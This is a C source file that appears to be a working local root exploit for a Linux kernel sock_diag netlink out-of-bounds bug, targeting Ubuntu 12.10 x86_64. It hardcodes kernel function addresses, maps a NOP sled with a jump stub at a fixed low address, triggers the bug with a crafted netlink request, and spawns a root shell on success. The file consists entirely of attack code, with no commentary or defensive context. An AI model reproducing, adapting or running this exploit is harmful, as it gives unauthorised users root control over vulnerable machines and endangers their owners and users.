#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/filter.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <linux/unix_diag.h>
#include <sys/mman.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long sock_diag_handlers, nl_table;

int __attribute__((regparm(3)))
x()
{
	commit_creds(prepare_kernel_cred(0));
	return -1;
}

char stage1[] = "\xff\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

int main() {
	int fd;
    unsigned long mmap_start, mmap_size = 0x10000;
	unsigned family;
	struct {
		struct nlmsghdr nlh;
		struct unix_diag_req r;
	} req;
	char	buf[8192];

	if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) < 0){
		printf("Can't create sock diag socket\n");
		return -1;
	}

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = sizeof(req);
	req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
	req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
	req.nlh.nlmsg_seq = 123456;

	req.r.udiag_states = -1;
	req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN;

	/* Ubuntu 12.10 x86_64 */
	req.r.sdiag_family = 0x37;
	commit_creds = (_commit_creds) 0xffffffff8107d180;
	prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff8107d410;
    mmap_start = 0x1a000;

    if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
		MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {

		printf("mmap fault\n");
		exit(1);
    }

    *(unsigned long *)&stage1[sizeof(stage1)-sizeof(&x)] = (unsigned long)x;
    memset((void *)mmap_start, 0x90, mmap_size);
    memcpy((void *)mmap_start+mmap_size-sizeof(stage1), stage1, sizeof(stage1));

	send(fd, &req, sizeof(req), 0);
	if(!getuid())
		system("/bin/sh");
}